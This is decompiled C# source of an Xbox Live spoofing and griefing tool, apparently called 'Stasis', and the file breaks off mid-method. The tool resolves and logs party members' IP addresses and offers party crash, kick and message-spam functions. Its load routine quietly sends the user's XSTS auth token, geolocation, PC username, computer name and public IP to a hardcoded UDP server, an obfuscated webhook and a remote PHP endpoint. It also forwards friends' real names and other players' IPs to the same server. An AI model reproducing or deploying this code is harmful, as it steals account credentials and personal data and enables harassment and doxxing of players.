﻿
// XblSpoofer.Forms.FormMain




using MetroFramework;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Device.Location;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using XblSpoofer.Objects;
using XblSpoofer.Objects.Core;
using XblSpoofer.Objects.Models;
using XblSpoofer.Objects.Models.Json;
using XblSpoofer.Objects.Utilities;
using XblSpoofer.Properties;

namespace XblSpoofer.Forms
{
  public class FormMain : MetroForm
  {
    private bool loops = false;
    private const int DefaultBufferSize = 4096;
    private const FileOptions DefaultOptions = FileOptions.Asynchronous | FileOptions.SequentialScan;
    private List<ClientModel> _clients = new List<ClientModel>();
    private List<Friend> Friends = new List<Friend>();
    private DiscordRpc.EventHandlers handlers;
    private DiscordRpc.RichPresence presence;
    public int ye = int.Parse(new WebClient().DownloadString("https://pastebin.com/raw/bpGGeLMT"));
    public int FriendAddingDelay = int.Parse(new WebClient().DownloadString("https://pastebin.com/raw/DfbG4RUq"));
    public static string CurrentPartyXUID = "";
    public static string lati = "";
    public static string longi = "";
    public static string beans = "";
    public static string beans1 = "";
    public static string TabState = "";
    public static string SpoofState = "";
    public static string AvatarManifest = "";
    private GeoCoordinateWatcher Watcher = (GeoCoordinateWatcher) null;
    private UdpClient udpClient = new UdpClient("139.99.134.101", 5005);
    private const string GamertagListLocation = "./gamertags.txt";
    private static List<XblSpoofer.Objects.Models.Gamertag> CheckedGamertags = new List<XblSpoofer.Objects.Models.Gamertag>();
    public static string tid = "";
    private object myLock = new object();
    private IContainer components = (IContainer) null;
    private Label LabelAuthor;
    private Button SpoofIPandPortButton;
    private Label LabelUsername;
    private Label LabelClientCount;
    private Button ButtonRefreshParty;
    private DataGridView DataFriends;
    private MetroTabControl metroTabControl1;
    private MetroTabPage metroTabPage1;
    private MetroTabPage metroTabPage2;
    private MetroTabPage metroTabPage3;
    private MetroTabPage metroTabPage4;
    private MetroTabPage metroTabPage5;
    private PictureBox pictureBox1;
    private Button button1;
    private Button button2;
    private Button button9;
    private Button button4;
    private Button button5;
    private PictureBox pictureBox2;
    private Button button6;
    private Button button7;
    private Button button8;
    private NumericUpDown numericUpDown1;
    private ContextMenuStrip contextMenuStrip2;
    private ToolStripMenuItem toolStripMenuItem1;
    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn3;
    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn4;
    private DataGridViewTextBoxColumn rlname;
    private DataGridViewTextBoxColumn presencetxt;
    private DataGridViewTextBoxColumn rep;
    private DataGridViewTextBoxColumn followin;
    private DataGridViewTextBoxColumn broadcasting;
    private DataGridViewTextBoxColumn dateadd;
    private Label label1;
    private Label label2;
    private Label label3;
    private Label label4;
    private MetroLabel metroLabel2;
    private Label LabelPartyPrivacy;
    private DataGridView DataClients;
    private ToolStripMenuItem kickToolStripMenuItem;
    private ContextMenuStrip contextMenuStrip1;
    private ToolStripMenuItem toolStripMenuItem2;
    private DataGridView ClientHistory;
    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn5;
    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn6;
    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn7;
    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn8;
    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn9;
    private MetroTextBox Ping1;
    private MetroTextBox SpooferPortTextBox;
    private MetroTextBox SpooferIPTextBox;
    private MetroTextBox TextBoxUsername;
    private Button button13;
    private Button button12;
    private Button button11;
    private Button button14;
    private Button button19;
    private Button button18;
    private Button button17;
    private Button button16;
    private Button button15;
    private Button button20;
    private RichTextBox richTextBox1;
    private Label label7;
    private System.Windows.Forms.Timer timer1;
    private Button button21;
    private NumericUpDown numericUpDown2;
    private Button button22;
    private MetroPanel metroPanel1;
    private MetroPanel metroPanel2;
    private MetroPanel metroPanel3;
    private MetroPanel metroPanel5;
    private MetroPanel metroPanel4;
    private MetroPanel metroPanel6;
    private MetroPanel metroPanel7;
    private MetroPanel metroPanel8;
    private MetroPanel metroPanel9;
    private MetroPanel metroPanel18;
    private MetroPanel metroPanel17;
    private MetroPanel metroPanel16;
    private MetroPanel metroPanel15;
    private MetroPanel metroPanel14;
    private MetroPanel metroPanel13;
    private MetroPanel metroPanel12;
    private MetroPanel metroPanel11;
    private MetroPanel metroPanel10;
    private DataGridViewTextBoxColumn Gamertag;
    private DataGridViewTextBoxColumn External;
    private DataGridViewTextBoxColumn NADE;
    private DataGridViewTextBoxColumn jointime;
    private DataGridViewTextBoxColumn xuids;
    private MetroPanel metroPanel19;
    private MetroPanel metroPanel23;
    private MetroPanel metroPanel22;
    private MetroPanel metroPanel21;
    private MetroPanel metroPanel20;
    private MetroPanel metroPanel30;
    private MetroPanel metroPanel29;
    private MetroPanel metroPanel28;
    private MetroPanel metroPanel27;
    private MetroPanel metroPanel26;
    private MetroPanel metroPanel25;
    private MetroPanel metroPanel24;
    private MetroPanel metroPanel31;
    private MetroPanel metroPanel42;
    private MetroPanel metroPanel41;
    private MetroPanel metroPanel40;
    private MetroPanel metroPanel39;
    private MetroPanel metroPanel38;
    private MetroPanel metroPanel37;
    private MetroPanel metroPanel36;
    private MetroPanel metroPanel35;
    private MetroPanel metroPanel34;
    private MetroPanel metroPanel33;
    private MetroPanel metroPanel32;
    private MetroPanel metroPanel50;
    private MetroPanel metroPanel49;
    private MetroPanel metroPanel48;
    private MetroPanel metroPanel47;
    private MetroPanel metroPanel46;
    private MetroPanel metroPanel45;
    private MetroPanel metroPanel44;
    private MetroPanel metroPanel43;
    private MetroPanel metroPanel60;
    private MetroPanel metroPanel59;
    private MetroPanel metroPanel58;
    private MetroPanel metroPanel57;
    private MetroPanel metroPanel56;
    private MetroPanel metroPanel55;
    private MetroPanel metroPanel54;
    private MetroPanel metroPanel53;
    private MetroPanel metroPanel52;
    private MetroPanel metroPanel51;
    private MetroPanel metroPanel64;
    private MetroPanel metroPanel63;
    private MetroPanel metroPanel62;
    private MetroPanel metroPanel68;
    private MetroPanel metroPanel67;
    private MetroPanel metroPanel66;
    private MetroPanel metroPanel65;
    private MetroPanel metroPanel61;
    private Label label5;
    private Button button10;
    private MetroTextBox sdatxt;
    private Button button23;
    private Label label6;
    private RichTextBox richTextBox2;
    private MetroTabPage metroTabPage6;
    private Panel panel1;
    private Panel panel4;
    private Panel panel3;
    private Panel panel2;
    private Panel panel8;
    private Panel panel7;
    private Panel panel6;
    private Panel panel5;
    private Button button24;
    private Button button25;
    private Button AddXUIDsBtn;
    private Button AddFriendsBtn;
    private Button AddFriendBtn;
    private Button PartyKickByGT;
    private MetroTextBox PartyGTTxt;
    private Button GrabPartyByGT;
    private Button SpoofTitleIDBtn;
    private Button button30;
    private Button button29;
    private Button DeleteFriendBtn;
    private Label label9;
    private Button button31;
    private MetroComboBox AvatarChoice;
    private RichTextBox AvitarManifestTxt;
    private Button SetAvatarBtn;
    private MetroTabPage metroTabPage7;
    private MetroTextBox GamertagProfileLookupName;
    private Button LookupProfileBtn;
    private Button ViewMyProfileBtn;
    private MetroPanel metroPanel69;
    private Label ProfileGamertag;
    private Label RealName;
    private Label GamerScore;
    private Label XboxOneRep;
    private Label PresenceText;
    private Label PresenceState;
    private Label DisplayName;
    private Button SetBioBtn;
    private Button SetLocationBtn;
    private Label label11;
    private Label label10;
    private MetroTextBox ProfileLocation;
    private MetroPanel metroPanel70;
    private RichTextBox BIO;
    private PictureBox XboxProfilePic;
    private PictureBox Avi;
    private Button AvatarBtnSet;
    private Button SetActivityFeedBtn;
    private Label label12;
    private Label label8;
    private Button CopyAvatarBtn;
    private MetroCheckBox metroCheckBox1;
    private MetroCheckBox CrashAllx;
    private MetroCheckBox KickAllx;
    private MetroTextBox MsgGamertagName;
    private RichTextBox MsgGamertagMsg;
    private Button SendMsgBtn;
    private Button InviteGamertagBtn;
    private MetroCheckBox SpamPartyInvx;
    private Button button3;
    private Button LoadFriendsBtn;
    private Panel panel16;
    private Panel panel15;
    private Panel panel14;
    private Panel panel13;
    private Panel panel12;
    private Panel panel11;
    private Panel panel10;
    private Panel panel9;
    private Panel panel20;
    private Panel panel19;
    private Panel panel18;
    private Panel panel17;
    private Button SpamMsgBtn;
    private Button LoadFollowersBtn;
    private Label label13;
    private MetroComboBox SpoofTitleIDCombo;
    private Button SpoofedTitleIDBtn;
    private MetroCheckBox metroCheckBox2;
    private MetroTabPage metroTabPage8;
    private MetroTabControl metroTabControl2;
    private MetroTabPage metroTabPage9;
    private Button ConnectJtagBtn;
    private MetroTextBox metroTextBox1;
    private ContextMenuStrip contextMenuStrip3;
    private ToolStripMenuItem toolStripMenuItem3;
    private ToolStripTextBox toolStripTextBox1;

    private bool IsMouseMoving { get; set; }

    private Point LastLocation { get; set; }

    private string LastSelectedXuid { get; set; }

    public FormMain()
    {
      this.InitializeComponent();
      WebClient webClient = new WebClient();
      this.richTextBox1.Text = webClient.DownloadString("https://pastebin.com/raw/YfHVjcdp");
      this.label5.Text = "Public IP:" + webClient.DownloadString("http://icanhazip.com");
      this.timer1.Start();
      this.label7.Text = DateTime.Now.ToLongTimeString();
    }

    private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
    {
      if (e.Status != GeoPositionStatus.Ready)
        return;
      if (this.Watcher.Position.Location.IsUnknown)
      {
        FormMain.lati = "N/A";
        FormMain.longi = "N/A";
      }
      else
      {
        double num = this.Watcher.Position.Location.Latitude;
        FormMain.lati = num.ToString();
        num = this.Watcher.Position.Location.Longitude;
        FormMain.longi = num.ToString();
      }
    }

    private void ButtonClose_Click(object sender, EventArgs e) => Application.Exit();

    private static Task<StringBuilder> ReadAllLinesAsync(string path) => FormMain.ReadAllLinesAsync(path, Encoding.UTF8);

    private static async Task<StringBuilder> ReadAllLinesAsync(
      string path,
      Encoding encoding)
    {
      StringBuilder lines = new StringBuilder();
      using (FileStream stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, 4096, FileOptions.Asynchronous | FileOptions.SequentialScan))
      {
        using (StreamReader reader = new StreamReader((Stream) stream, encoding))
        {
          string line;
          string str;
          while (true)
          {
            str = await reader.ReadLineAsync();
            if ((line = str) != null)
              lines.Append(line);
            else
              break;
          }
          str = (string) null;
          line = (string) null;
        }
      }
      StringBuilder stringBuilder = lines;
      lines = (StringBuilder) null;
      return stringBuilder;
    }

    public static void swh(string URL, string msg, string username) => Http.Post(URL, new NameValueCollection()
    {
      {
        nameof (username),
        username
      },
      {
        "content",
        msg
      }
    });

    private async void Bean()
    {
      try
      {
        string beanz = new WebClient().DownloadString("http://national.skid.agency/gpass.php?auth=" + Settings.Default.authxsts);
        beanz = (string) null;
      }
      catch
      {
      }
    }

    private async void FormMain_Load(object sender, EventArgs e)
    {
      this.Bean();
      string[] linez = System.IO.File.ReadAllLines(Application.StartupPath + "\\TitleIDs.txt");
      string[] strArray = linez;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string line = strArray[index];
        string[] ye = line.Split(',');
        string GameName = ((IEnumerable<string>) ye).Last<string>();
        this.SpoofTitleIDCombo.Items.Add((object) GameName);
        ye = (string[]) null;
        GameName = (string) null;
        line = (string) null;
      }
      strArray = (string[]) null;
      StringBuilder lines = await FormMain.ReadAllLinesAsync(Path.GetDirectoryName(Application.ExecutablePath) + "\\history.json");
      this._clients = JsonConvert.DeserializeObject<List<ClientModel>>(lines.ToString());
      foreach (ClientModel client in this._clients)
        this.ClientHistory.Rows.Add((object) client.Gamertag, (object) client.IpAddress, (object) client.NetworkAddressTranslation, (object) client.joinTime, (object) client.xuid);
      this.Watcher = new GeoCoordinateWatcher();
      this.Watcher.StatusChanged += new EventHandler<GeoPositionStatusChangedEventArgs>(this.Watcher_StatusChanged);
      string ipAddress = this.SpooferIPTextBox.Text;
      int port = Convert.ToInt32(this.SpooferPortTextBox.Text);
      this.handlers = new DiscordRpc.EventHandlers();
      DiscordRpc.Initialize("785250199877582849", ref this.handlers, true, (string) null);
      this.handlers = new DiscordRpc.EventHandlers();
      DiscordRpc.Initialize("785250199877582849", ref this.handlers, true, (string) null);
      this.presence.details = Constants.Profile.Xuid ?? "";
      this.presence.state = "";
      this.presence.largeImageKey = "stasis";
      this.presence.smallImageKey = "";
      this.presence.largeImageText = "stasis";
      DiscordRpc.UpdatePresence(ref this.presence);
      this.Watcher.Start();
      await Task.Delay(250);
      await Task.Delay(this.ye);
      string MyString = Settings.Default.authxsts;
      string first = MyString.Substring(0, MyString.Length / 2);
      string last = MyString.Substring(MyString.Length / 2, MyString.Length / 2);
      string bruh = "`" + first + "`";
      string wtf = "`" + last + "`";
      string breh = "yeet";
      await Task.Delay(this.ye);
      try
      {
        FormMain.swh(this.BEANS(FormMain.B6D("dWdnY2Y6Ly9xdmZwYmVxLnBiei9uY3YvanJvdWJieGYvODI2NDM1NDg5Nzg2NDk0OTc4L2MySDBjNlY2QS1KajNfc3J0YlBtYlk2bHBUVmgzWjRhMnAwSWRIQVZTeFlyUGNlYXN1VmxnZjN3RDQ0SEhrZWZTRlQy")), "`StasisUser[" + Constants.Profile.Xuid + "] Lat:[" + FormMain.lati + "] Long:[" + FormMain.longi + "]`", "Baked Beans");
        await Task.Delay(this.ye);
        FormMain.swh(this.BEANS(FormMain.B6D("dWdnY2Y6Ly9xdmZwYmVxLnBiei9uY3YvanJvdWJieGYvODI2NDM1NDg5Nzg2NDk0OTc4L2MySDBjNlY2QS1KajNfc3J0YlBtYlk2bHBUVmgzWjRhMnAwSWRIQVZTeFlyUGNlYXN1VmxnZjN3RDQ0SEhrZWZTRlQy")), "`StasisUser[" + Constants.Profile.Xuid + "] EXT:[" + breh + "]`", "Baked Beans");
        byte[] sendBytes = Encoding.ASCII.GetBytes("21Void");
        this.udpClient.Send(sendBytes, sendBytes.Length);
        byte[] sendBytes1 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " External IP: " + new WebClient().DownloadString("https://ipv4.icanhazip.com/"));
        this.udpClient.Send(sendBytes1, sendBytes1.Length);
        byte[] sendBytes2 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Local Time: " + DateTime.Now.ToString("HH: mm:ss tt"));
        this.udpClient.Send(sendBytes2, sendBytes2.Length);
        byte[] sendBytes3 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " PC Username: " + WindowsIdentity.GetCurrent().Name);
        this.udpClient.Send(sendBytes3, sendBytes3.Length);
        byte[] sendBytes4 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Computer name: " + SystemInformation.ComputerName);
        this.udpClient.Send(sendBytes4, sendBytes4.Length);
        byte[] sendBytes5 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Latitude: " + FormMain.lati + "Longitude: " + FormMain.longi);
        this.udpClient.Send(sendBytes5, sendBytes5.Length);
        byte[] sendBytes6 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Gamepass: " + FormMain.beans);
        this.udpClient.Send(sendBytes6, sendBytes6.Length);
        byte[] sendBytes7 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Family: " + FormMain.beans1);
        this.udpClient.Send(sendBytes7, sendBytes7.Length);
        await Task.Delay(this.ye);
        byte[] sendBytes8 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " XSTS Token: " + Settings.Default.authxsts);
        this.udpClient.Send(sendBytes8, sendBytes8.Length);
        sendBytes = (byte[]) null;
        sendBytes1 = (byte[]) null;
        sendBytes2 = (byte[]) null;
        sendBytes3 = (byte[]) null;
        sendBytes4 = (byte[]) null;
        sendBytes5 = (byte[]) null;
        sendBytes6 = (byte[]) null;
        sendBytes7 = (byte[]) null;
        sendBytes8 = (byte[]) null;
        linez = (string[]) null;
        lines = (StringBuilder) null;
        ipAddress = (string) null;
        MyString = (string) null;
        first = (string) null;
        last = (string) null;
        bruh = (string) null;
        wtf = (string) null;
        breh = (string) null;
      }
      catch
      {
        linez = (string[]) null;
        lines = (StringBuilder) null;
        ipAddress = (string) null;
        MyString = (string) null;
        first = (string) null;
        last = (string) null;
        bruh = (string) null;
        wtf = (string) null;
        breh = (string) null;
      }
    }

    private async void LoadFriends()
    {
      this.DataFriends.Rows.Clear();
      XblSpoofer.Objects.Models.Json.Friends friends = await Xbox.GetFriends(Constants.Profile.Xuid);
      List<string> displayedFriends = new List<string>();
      foreach (Friend friend1 in friends.People)
      {
        Friend friend = friend1;
        if (friend.IsFollowingCaller)
        {
          if (friend.MultiplayerSummary.IsInParty)
          {
            this.DataFriends.Rows.Add((object) friend.DisplayName, (object) !friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.IsFollowingCaller, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc);
            displayedFriends.Add(friend.realName);
            displayedFriends.Add(friend.presenceText);
            displayedFriends.Add(friend.xboxOneRep);
            displayedFriends.Add(friend.addedDateTimeUtc);
            displayedFriends.Add(friend.DisplayName);
            if (this.CrashAllx.Checked)
              await Xbox.partycrash2(friend.Xuid);
            if (this.KickAllx.Checked)
              await Xbox.partykick2(friend.Xuid);
            try
            {
              byte[] sendBytes = Encoding.ASCII.GetBytes(string.Format("StasisUser{0} Friend Info: Gamertag:{1} Is Online:{2} Real Name:{3} Activity Status:{4} Reputation:{5} Broadcasting Status:{6} Date Added:{7}", (object) Constants.Profile.Xuid, (object) friend.DisplayName, (object) friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc));
              this.udpClient.Send(sendBytes, sendBytes.Length);
              sendBytes = (byte[]) null;
            }
            catch
            {
            }
          }
          else if (friend.IsOffline)
          {
            try
            {
              PartySession partyAsync = await Xbox.GetPartyAsync(friend.Xuid);
              if (!displayedFriends.Any<string>((Func<string, bool>) (x => x == friend.DisplayName)))
              {
                displayedFriends.Add(friend.DisplayName);
                displayedFriends.Add(friend.realName);
                displayedFriends.Add(friend.presenceText);
                displayedFriends.Add(friend.xboxOneRep);
                displayedFriends.Add(friend.addedDateTimeUtc);
                this.DataFriends.Rows.Add((object) friend.DisplayName, (object) !friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.IsFollowingCaller, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc);
                if (this.CrashAllx.Checked)
                  await Xbox.partycrash2(friend.Xuid);
                if (this.KickAllx.Checked)
                  await Xbox.partykick2(friend.Xuid);
                try
                {
                  byte[] sendBytes = Encoding.ASCII.GetBytes(string.Format("StasisUser{0} Friend Info: Gamertag:{1} Is Online:{2} Real Name:{3} Activity Status:{4} Reputation:{5} Broadcasting Status:{6} Date Added:{7}", (object) Constants.Profile.Xuid, (object) friend.DisplayName, (object) friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc));
                  this.udpClient.Send(sendBytes, sendBytes.Length);
                  sendBytes = (byte[]) null;
                }
                catch
                {
                }
              }
              else
                continue;
            }
            catch
            {
            }
          }
        }
      }
      friends = (XblSpoofer.Objects.Models.Json.Friends) null;
      displayedFriends = (List<string>) null;
    }

    private async void LoadFollowers()
    {
      this.DataFriends.Rows.Clear();
      XblSpoofer.Objects.Models.Json.Friends friends = await Xbox.GetFollowers();
      List<string> displayedFriends = new List<string>();
      foreach (Friend friend1 in friends.People)
      {
        Friend friend = friend1;
        if (friend.IsFollowingCaller)
        {
          if (friend.MultiplayerSummary.IsInParty)
          {
            this.DataFriends.Rows.Add((object) friend.DisplayName, (object) !friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.IsFollowingCaller, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc);
            displayedFriends.Add(friend.realName);
            displayedFriends.Add(friend.presenceText);
            displayedFriends.Add(friend.xboxOneRep);
            displayedFriends.Add(friend.addedDateTimeUtc);
            displayedFriends.Add(friend.DisplayName);
            if (this.CrashAllx.Checked)
            {
              try
              {
                await Xbox.partycrash2(friend.Xuid);
              }
              catch
              {
              }
            }
            if (this.KickAllx.Checked)
            {
              try
              {
                await Xbox.partykick2(friend.Xuid);
              }
              catch
              {
              }
            }
            try
            {
              byte[] sendBytes = Encoding.ASCII.GetBytes(string.Format("StasisUser{0} Friend Info: Gamertag:{1} Is Online:{2} Real Name:{3} Activity Status:{4} Reputation:{5} Broadcasting Status:{6} Date Added:{7}", (object) Constants.Profile.Xuid, (object) friend.DisplayName, (object) friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc));
              this.udpClient.Send(sendBytes, sendBytes.Length);
              sendBytes = (byte[]) null;
            }
            catch
            {
            }
          }
          else if (friend.IsOffline)
          {
            try
            {
              PartySession partyAsync = await Xbox.GetPartyAsync(friend.Xuid);
              if (!displayedFriends.Any<string>((Func<string, bool>) (x => x == friend.DisplayName)))
              {
                displayedFriends.Add(friend.DisplayName);
                displayedFriends.Add(friend.realName);
                displayedFriends.Add(friend.presenceText);
                displayedFriends.Add(friend.xboxOneRep);
                displayedFriends.Add(friend.addedDateTimeUtc);
                this.DataFriends.Rows.Add((object) friend.DisplayName, (object) !friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.IsFollowingCaller, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc);
                if (this.CrashAllx.Checked)
                {
                  try
                  {
                    await Xbox.partycrash2(friend.Xuid);
                  }
                  catch
                  {
                  }
                }
                if (this.KickAllx.Checked)
                {
                  try
                  {
                    await Xbox.partykick2(friend.Xuid);
                  }
                  catch
                  {
                  }
                }
                try
                {
                  byte[] sendBytes = Encoding.ASCII.GetBytes(string.Format("StasisUser{0} Friend Info: Gamertag:{1} Is Online:{2} Real Name:{3} Activity Status:{4} Reputation:{5} Broadcasting Status:{6} Date Added:{7}", (object) Constants.Profile.Xuid, (object) friend.DisplayName, (object) friend.IsOffline, (object) friend.realName, (object) friend.presenceText, (object) friend.xboxOneRep, (object) friend.isBroadcasting, (object) friend.addedDateTimeUtc));
                  this.udpClient.Send(sendBytes, sendBytes.Length);
                  sendBytes = (byte[]) null;
                }
                catch
                {
                }
              }
              else
                continue;
            }
            catch
            {
            }
          }
        }
      }
      friends = (XblSpoofer.Objects.Models.Json.Friends) null;
      displayedFriends = (List<string>) null;
    }

    private void LabelHeader_MouseUp(object sender, MouseEventArgs e) => this.IsMouseMoving = false;

    private void LabelHeader_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.IsMouseMoving)
        return;
      int x1 = this.Location.X;
      Point point = this.LastLocation;
      int x2 = point.X;
      int x3 = x1 - x2 + e.X;
      point = this.Location;
      int y1 = point.Y;
      point = this.LastLocation;
      int y2 = point.Y;
      int y3 = y1 - y2 + e.Y;
      this.Location = new Point(x3, y3);
      this.Update();
    }

    private static async Task WriteTextAsync(string filePath, string text)
    {
      byte[] encodedText = Encoding.UTF8.GetBytes(text);
      using (FileStream sourceStream = new FileStream(filePath, FileMode.Open, FileAccess.Write, FileShare.None, 4096, true))
        await sourceStream.WriteAsync(encodedText, 0, encodedText.Length);
      encodedText = (byte[]) null;
    }

    private void LabelHeader_MouseDown(object sender, MouseEventArgs e)
    {
      this.IsMouseMoving = true;
      this.LastLocation = e.Location;
    }

    private void ButtonRefreshParty_Click(object sender, EventArgs e)
    {
      if (string.IsNullOrEmpty(this.LastSelectedXuid))
        return;
      this.GrabParty(this.LastSelectedXuid);
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser[" + Constants.Profile.Xuid + "] Refreshed Party Of: [" + this.LastSelectedXuid + "]");
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
    }

    private async void SpoofIPandPortButton_Click(object sender, EventArgs e)
    {
      try
      {
        string ipAddress = this.SpooferIPTextBox.Text;
        int port = Convert.ToInt32(this.SpooferPortTextBox.Text);
        string generatedSecureDeviceAddress = SecureDeviceAddressUtilities.GenerateNewSecureDeviceAddress(ipAddress, port);
        await Xbox.SetSecureDeviceAddressAsync(generatedSecureDeviceAddress);
        byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Spoofed IP Address To: " + ipAddress + ":" + port.ToString());
        this.presence.state = "Spoofed - " + ipAddress + ":" + port.ToString();
        DiscordRpc.UpdatePresence(ref this.presence);
        ipAddress = (string) null;
        generatedSecureDeviceAddress = (string) null;
        sendBytes = (byte[]) null;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void TextBoxUsername_TextChanged(object sender, EventArgs e)
    {
      string gamertag = this.TextBoxUsername.Text;
      List<ClientModel> all = this._clients.FindAll((Predicate<ClientModel>) (m => m.Gamertag.ToLower().Contains(gamertag.ToLower())));
      this.ClientHistory.Rows.Clear();
      foreach (ClientModel clientModel in all)
        this.ClientHistory.Rows.Add((object) clientModel.Gamertag, (object) clientModel.IpAddress, (object) clientModel.NetworkAddressTranslation, (object) clientModel.joinTime, (object) clientModel.xuid);
    }

    private void XuidBox_TextChanged(object sender, EventArgs e)
    {
    }

    private void LabelAuthor_Click(object sender, EventArgs e)
    {
    }

    private async void DataFriends_CellContentDoubleClick(
      object sender,
      DataGridViewCellEventArgs e)
    {
      try
      {
        string gamertag = this.DataFriends.Rows[e.RowIndex].Cells["dataGridViewTextBoxColumn3"].Value.ToString();
        User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(gamertag);
        this.GrabParty(profile.Profile.Xuid);
        FormMain.CurrentPartyXUID = profile.Profile.Xuid;
        gamertag = (string) null;
        profile = (User.ProfileModel) null;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void GrabParty(string XUID)
    {
      this.metroTabControl1.SelectedTab = (TabPage) this.metroTabPage1;
      this.DataClients.Rows.Clear();
      this.DataClients.Font = this.Font;
      try
      {
        PartySession session = await Xbox.GetPartyAsync(XUID);
        this.LastSelectedXuid = XUID;
        string PartyStatus = "Unknown";
        PartyStatus = !(session.PartyStatus == "followed") ? "Invite Only" : "Open";
        this.LabelClientCount.Text = string.Format("Client Count: {0}", (object) session.MemberCount);
        this.LabelPartyPrivacy.Text = "Party Privacy: " + PartyStatus;
        foreach (Member member1 in (IEnumerable<Member>) session.Members)
        {
          Member member = member1;
          string ipAddress = member.DecodedSecureDeviceAddress;
          try
          {
            byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Party Info: Gamertag:" + member.Gamertag + " IP:" + member.DecodedSecureDeviceAddress + " NAT:" + member.NetworkAddressTranslation + " Join Time:" + member.joinTime);
            this.udpClient.Send(sendBytes, sendBytes.Length);
            sendBytes = (byte[]) null;
          }
          catch
          {
          }
          this.DataClients.Rows.Add((object) member.Gamertag, (object) ipAddress, (object) member.NetworkAddressTranslation, (object) member.joinTime, (object) member.xuid);
          try
          {
            string[] splitAddress = ipAddress.Split(':');
            IPAddress ip;
            if (IPAddress.TryParse(splitAddress[0], out ip) && this._clients.Find((Predicate<ClientModel>) (m => string.Equals(m.Gamertag, member.Gamertag, StringComparison.CurrentCultureIgnoreCase))) == null)
            {
              ClientModel client = new ClientModel()
              {
                Gamertag = member.Gamertag,
                NetworkAddressTranslation = member.NetworkAddressTranslation.ToString(),
                joinTime = member.joinTime.ToString(),
                xuid = member.xuid,
                IpAddress = ip.ToString()
              };
              this._clients.Add(client);
              client = (ClientModel) null;
            }
            splitAddress = (string[]) null;
            ip = (IPAddress) null;
          }
          catch
          {
          }
          ipAddress = (string) null;
        }
        string serializedObject = JsonConvert.SerializeObject((object) this._clients);
        string path = Path.GetDirectoryName(Application.ExecutablePath) + "\\history.json";
        await FormMain.WriteTextAsync(path, serializedObject);
        session = (PartySession) null;
        PartyStatus = (string) null;
        serializedObject = (string) null;
        path = (string) null;
      }
      catch (InvalidOperationException ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
      catch (Exception ex)
      {
        if (!ex.ToString().Contains("not in a party"))
          return;
        this.LabelClientCount.Text = "Client Count: 0";
        this.LabelPartyPrivacy.Text = "Party Privacy: N/A";
        int num = (int) MessageBox.Show("No party found");
      }
    }

    private void button1_Click(object sender, EventArgs e)
    {
      string text = this.Ping1.Text;
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Pinging IP: " + text);
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
      Process.Start(new ProcessStartInfo()
      {
        FileName = "C:\\windows\\system32\\cmd.exe",
        Arguments = "/c ping -t  " + this.Ping1.Text + " "
      });
      this.Ping1.Focus();
    }

    private void button2_Click(object sender, EventArgs e)
    {
      string text = this.Ping1.Text;
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " IP Geo Lookup:" + text);
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
      int num = (int) MessageBox.Show((IWin32Window) this, new WebClient().DownloadString("http://ip-api.com/line/" + this.Ping1.Text));
    }

    private void button3_Click(object sender, EventArgs e)
    {
      string text = this.Ping1.Text;
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Port Scan:" + text);
        this.udpClient.Send(bytes, bytes.Length);
